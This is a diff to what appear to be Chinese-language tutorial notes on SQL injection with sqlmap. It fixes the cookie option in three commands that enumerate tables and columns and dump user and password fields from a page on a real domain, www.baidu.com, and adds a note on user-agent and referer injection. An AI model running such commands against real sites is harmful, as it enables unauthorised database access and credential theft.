@@ -91,14 +91,14 @@
 	(2)cookies注入：当程序有防get注入的时候，可以使用cookie注入(只有level达到2才会检测cookie)
 	
 	
-	sqlmap -u http://www.baidu.com/shownews.asp   --cookies  "id=9" --tables --level 2 				
+	sqlmap -u http://www.baidu.com/shownews.asp   --cookie  "id=9" --tables --level 2 				
 	
-	sqlmap -u http://www.baidu.com/shownews.asp   --cookies  "id=9" -T tableName --columns --level 2 
+	sqlmap -u http://www.baidu.com/shownews.asp   --cookie  "id=9" -T tableName --columns --level 2 
 	
-	sqlmap -u http://www.baidu.com/shownews.asp   --cookies  "id=9" -T tableName -C user,password --dump --level 2 
+	sqlmap -u http://www.baidu.com/shownews.asp   --cookie  "id=9" -T tableName -C user,password --dump --level 2 
 	
 
-	
+	level 3 为user-agent注入 referer注入
 	(3)post注入
 	
 	a.可以使用burpsuite工具来抓取post包
